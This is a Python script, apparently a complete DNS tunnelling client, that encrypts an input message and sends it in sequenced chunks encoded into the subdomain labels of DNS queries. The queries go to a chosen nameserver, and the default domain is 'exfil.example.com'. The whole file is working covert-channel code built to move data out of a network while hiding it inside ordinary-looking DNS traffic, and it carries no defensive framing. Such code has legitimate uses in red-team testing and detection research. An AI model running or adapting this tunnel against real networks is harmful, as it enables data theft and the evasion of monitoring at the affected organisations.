#!/usr/bin/env python3
import argparse
import base64
import socket
import struct
import sys
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256
from Crypto.Random import get_random_bytes
from dnslib import DNSRecord

# Adjusted capacity calculation for multi-label FQDN limits
# Total fully qualified domain name cannot exceed 253 characters.
# Leaving room for subdomains and your base domain, we target ~110 raw bytes max.
MAX_RAW_CAPACITY = 110


class AdvancedCryptoClient:

    def __init__(self, secret: bytes):
        self.master_secret = secret

    def _derive_key(self, session_id: bytes) -> bytes:
        h = HMAC.new(self.master_secret, digestmod=SHA256)
        h.update(session_id)
        return h.digest()[:32]

    def encrypt_payload(self, plaintext: bytes, session_id: bytes) -> bytes:
        key = self._derive_key(session_id)
        nonce = get_random_bytes(12)
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        ciphertext, gcm_tag = cipher.encrypt_and_digest(plaintext)

        h = HMAC.new(key, digestmod=SHA256)
        h.update(nonce + ciphertext + gcm_tag)
        hmac_tag = h.digest()[:4]
        return nonce + ciphertext + gcm_tag + hmac_tag


def segment_base32_to_labels(b32_string: str, label_size: int = 60) -> str:
    """Splits a long unified string into dot-separated valid DNS subdomains."""
    return ".".join(
        b32_string[i : i + label_size]
        for i in range(0, len(b32_string), label_size)
    )


def main():
    parser = argparse.ArgumentParser(description="Advanced DNS Tunnel Client")
    parser.add_argument("-d", "--domain", default="exfil.example.com")
    parser.add_argument("-n", "--nameserver", required=True)
    parser.add_argument("-p", "--port", type=int, default=53)
    parser.add_argument("-s", "--secret-file", required=True)
    parser.add_argument("-m", "--message", required=True)
    args = parser.parse_args()

    secret = Path(args.secret_file).read_bytes()
    crypto = AdvancedCryptoClient(secret)

    # 48 bytes overhead + 4 bytes sequencing header = 52 bytes base overhead.
    # 110 max capacity - 52 overhead = ~58 raw data bytes per DNS request.
    chunk_size = 58
    raw_data = args.message.encode("utf-8")
    data_chunks = [
        raw_data[i : i + chunk_size] for i in range(0, len(raw_data), chunk_size)
    ]

    session_id = get_random_bytes(16)
    total_chunks = len(data_chunks)

    print(
        f"[+] Streaming {len(raw_data)} bytes split into {total_chunks} sequenced frames."
    )

    for seq_num, chunk in enumerate(data_chunks):
        is_last = 1 if (seq_num == total_chunks - 1) else 0

        # Pack custom 4-byte sequencing header: Sequence, IsLast Flag, Payload Length
        header = struct.pack("!HBB", seq_num, is_last, len(chunk))
        plaintext_frame = header + chunk

        # Encrypt frame
        encrypted_blob = crypto.encrypt_payload(plaintext_frame, session_id)
        final_binary = session_id + encrypted_blob

        # Encode and safely format into multi-label hierarchy
        b32_str = base64.b32encode(final_binary).decode("utf-8").rstrip("=")
        subdomains = segment_base32_to_labels(b32_str).lower()

        fqdn = f"{subdomains}.{args.domain.strip('.')}"
        print(f"  -> Dispatching Frame {seq_num} | FQDN Len: {len(fqdn)}")

        # Send standard UDP DNS Query
        record = DNSRecord.question(fqdn, "A")
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(2.0)
            try:
                sock.sendto(record.pack(), (args.nameserver, args.port))
                sock.recvfrom(512)  # Wait for dummy acknowledgement
            except Exception:
                pass  # In true UDP streaming, keep pushing frames down the wire


if __name__ == "__main__":
    main()